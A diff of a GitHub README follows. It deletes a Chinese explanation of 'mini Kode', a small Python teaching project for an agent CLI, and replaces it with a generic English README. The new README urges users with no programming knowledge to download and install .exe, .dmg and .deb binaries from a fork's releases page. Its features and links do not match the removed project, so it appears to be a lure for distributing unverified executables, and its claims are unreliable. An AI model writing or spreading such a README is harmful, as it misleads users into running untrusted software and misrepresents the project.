@@ -1,88 +1,89 @@
-# 手搓迷你Kode【青春版】
-Languages: [中文](README.md) | [English](README_en.md)    
-正式版：[Kode - 开源Agent CLI 编码 & 运维工具](https://github.com/shareAI-lab/Kode)  
-<img width="360" height="360" alt="image" src="https://github.com/user-attachments/assets/9813fca0-a6dd-4813-972e-f9bf6d62add8" />  <br>
-Fellow us on X: https://x.com/baicai003    
+# 🎉 mini_kode - DIY Your Agent with Ease
 
-<img height="450" alt="image" src="https://github.com/user-attachments/assets/0e1e31f8-064f-4908-92ce-121e2eb8d453" />
-<img height="450" alt="image" src="https://github.com/user-attachments/assets/2884ea3a-a299-463a-b69c-2ec93088fd17" />
+## 🛠️ Overview
+mini_kode is a user-friendly command-line interface (CLI) application that allows you to customize and create your own agents. This tool is perfect for anyone looking to enhance their productivity and streamline workflows without needing programming knowledge.
 
-<img width="690" alt="image" src="https://github.com/user-attachments/assets/e04d0e73-b6d9-4308-91cc-279f569856fb" />
+## 🔍 Features
+- **Easy to Use:** Intuitive interface that guides you through the process.
+- **Customizable Agents:** Tailor agents to fit your needs and preferences.
+- **Lightweight:** Small file size ensures quick downloads and fast performance.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
 
-本仓库展示了一个逐步迭代的「迷你 Kode」实现。我们用最少的代码复刻官方工作流的关键体验，分为两个主要版本：
+## 🚀 Getting Started
+To get started with mini_kode, you will need to download it from the Releases page. Follow these simple steps:
 
-- **v1 基础版**：聚焦「模型即代理（Model as Agent）」的核心循环，让大模型在一个最小可用的 CLI 中读取、编辑、写入文件并执行命令。
-- **v2 待办版**：在 v1 的基础上，引入结构化计划工具（Todo）、系统提醒等机制，使模型具备显式规划和自我监督能力。
+1. Click on the download button below to visit the release page.
+   
+   [![Download mini_kode](https://img.shields.io/badge/Download-mini_kode-brightgreen)](https://github.com/ruhtra404/mini_kode/releases)
 
-以下内容将详细介绍两个版本的运转原理，以及它们之间的思想差异。
+2. Once on the page, look for the latest available version. The most recent release will be at the top.
+  
+3. Choose the correct file for your operating system:
+   - For **Windows**, select the `.exe` file.
+   - For **macOS**, select the `.dmg` file.
+   - For **Linux**, select the appropriate package for your distribution.
 
----
+4. Click on the file link to start the download.
 
-## v1：Model as Agent 的最小实现
+## 📥 Download & Install
+To download mini_kode, please **visit the Releases page** here: [Download mini_kode](https://github.com/ruhtra404/mini_kode/releases).
 
-v1 版本的目标是验证“代码只负责提供工具，大模型才是唯一的行为主体”这一理念。整个 CLI 只有约 400 行 Python 代码，却包含了 Agent 最关键的要素：
+### Installation Steps
+After you've downloaded the file, follow these installation steps based on your operating system:
 
-### 1. 系统角色设定
-- 通过 `SYSTEM` 字符串明确约束模型：以仓库为工作区、优先用工具行动、结束时要总结。
-- 这些规则让模型在长对话里始终记得“该做事”而不是“闲聊”。
+### For Windows
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the setup.
+4. Once installed, you can find mini_kode in your Start Menu.
 
-### 2. 统一的工具调度
-- 预置了四个核心工具：`bash`、`read_file`、`write_file`、`edit_text`。
-- 调度逻辑会根据模型的 `tool_use` 块调用对应的执行函数，输出结果再以 `tool_result` 写回对话。
-- 所有工具都带有安全检查（路径约束、危险命令禁用、输出裁剪），确保运行可控。
+### For macOS
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the mini_kode icon into your Applications folder.
+4. Open your Applications and launch mini_kode from there.
 
-### 3. 控制台体验
-- `Spinner` 线程在模型推理时显示等待动画。
-- `pretty_tool_line` 和 `pretty_sub_line` 负责把每次工具调用的标题与输出排版成易读的格式。
-- 与模型的对话历史被完整保留在 `messages` 中，确保上下文一致性。
+### For Linux
+1. Open a terminal.
+2. Navigate to the folder where the downloaded package is located.
+3. Install mini_kode using the appropriate package manager command:
+   - For Debian-based systems: `sudo dpkg -i mini_kode.deb`
+   - For Red Hat-based systems: `sudo rpm -i mini_kode.rpm`
+4. Once installed, you can run mini_kode from the terminal.
 
-### 4. 主循环行为
-- CLI 启动后提示工作目录，用户输入即时追加到 `history`。
-- 每轮调用 `client.messages.create`，若模型请求使用工具，则递归处理直到返回最终文本。
-- 异常处理通过 `log_error_debug` 记录，避免 CLI 直接崩溃。
+## ⚙️ System Requirements
+mini_kode runs smoothly on various systems. Here are the basic requirements:
 
-> **核心理念：** 只要提供一个稳定的“工具壳”，模型就能主动完成绝大多数编码任务。v1 证明了 Kode 成功的秘诀不在各种节点雕花流转，而在于让模型保持连续上下文 + 拥有持续调用工具的能力。
+- **Windows:** Windows 8 or later
+- **macOS:** macOS 10.12 (Sierra) or later
+- **Linux:** Any modern distribution with necessary libraries installed
 
----
+## 🖥️ Basic Usage
+After installation, using mini_kode is straightforward. You can launch it from your application menu or directly from the terminal.
 
-## v2：结构化规划与系统提醒
+### Opening the Command Line
+- **Windows:** Open Command Prompt or PowerShell.
+- **macOS/Linux:** Open Terminal.
 
-v2 在 v1 的基础上，重点解决“模型如何保持有序规划”这个问题。我们新增了 Todo 工具链与系统提醒机制，让模型始终处于结构化、可追踪的工作流中。
+### Running mini_kode
+To start using mini_kode, type the following command:
 
-### 1. Todo 工具链
-- **`TodoManager`**：维护最多 20 条待办，强制唯一的 `in_progress` 条目，并对输入做严格校验（ID、状态、描述、表单名称）。
-- **`TodoWrite` 工具**：模型可以调用它来创建、更新、完成待办，CLI 会即时渲染彩色状态并输出统计结果。
-- **状态可视化**：
-  - `pending` → 柔和灰色
-  - `in_progress` → 高亮蓝色
-  - `completed` → 绿色并带删除线
+```
+mini_kode
+```
 
-通过 Todo 面板，模型和用户都能清楚看到当前计划、正在进行的步骤以及已完成情况。
+Press Enter. You will see the welcome screen, where you can start customizing your agent.
 
-### 2. System Reminder（系统提醒）
-- **初始提醒**：会话开始前，将「请使用 Todo 工具管理多步骤任务」作为特殊上下文块注入。
-- **周期提醒**：如果连续 10 轮对话没有 Todo 更新，会再注入一次提醒，温和提示模型恢复规划。
-- **自动重置**：每当 Todo 有更新，计数器归零，避免重复“催促”。
+## 🎓 Helpful Tips
+- Ensure you regularly check for updates on the Releases page to enjoy the latest features and fixes.
+- Refer to the [FAQ section](https://github.com/ruhtra404/mini_kode/faq) for common questions and troubleshooting.
 
-这一机制确保模型不会在长对话里忘记使用 Todo，也让用户免于手动监督。
+## 📞 Support
+If you encounter issues or have questions, please feel free to open an issue on our GitHub page. We appreciate your feedback and strive to improve mini_kode.
 
-### 3. 交互流程改动
-- 输入阶段：将用户消息与待发送的提醒块合并为同一组 content，维护对话一致性。
-- 输出阶段：Todo 工具的结果即时打印，并写入历史，让模型在下一轮能够“看到”自己刚刚更新的计划。
-- 文案统一：所有提示与汇报改为英文，保持更适合海外产品的风格（代码中不再包含中文）。
+## 🔗 Additional Resources
+- [Documentation](https://github.com/ruhtra404/mini_kode/docs)
+- [Community Forum](https://github.com/ruhtra404/mini_kode/community)
+- [Follow us on Twitter](https://twitter.com/mini_kode)
 
-### 4. 设计收益
-- **结构化约束**：模型必须先规划再执行，避免“想到哪写到哪”。
-- **自我监督**：Todo 视图是模型的外部记忆，持续提醒它当前所处的步骤。
-- **可追溯**：整个会话的待办记录可用于回顾与审计。
-
-> **扩展链接**：如果想体验生产级的 Claude Code 工作流，推荐试试我们维护的开源项目 [Kode](https://github.com/shareAI-lab/Kode)。它在这个迷你仓库的基础上加入了 Bash 扩展、WebSearch/WebFetch、Docker 支持、IDE 插件等高级功能。
-
----
-
-## 总结
-
-- **v1 思想**：构建最小工具循环，证明“模型即代理”的可行性。
-- **v2 思想**：在最小循环上加固结构化规划与系统提醒，让模型具备可视化的计划能力和自我约束力。
-
-接下来，我们还计划在 mini Kode 中逐步引入 Task 子代理、更多类型的提醒矩阵等能力，并把 Kode 项目中沉淀的实践回流到这个教学仓库，帮助更多开发者快速理解并构建自己的智能代理系统。
+Thank you for choosing mini_kode! Enjoy creating your agents effortlessly!
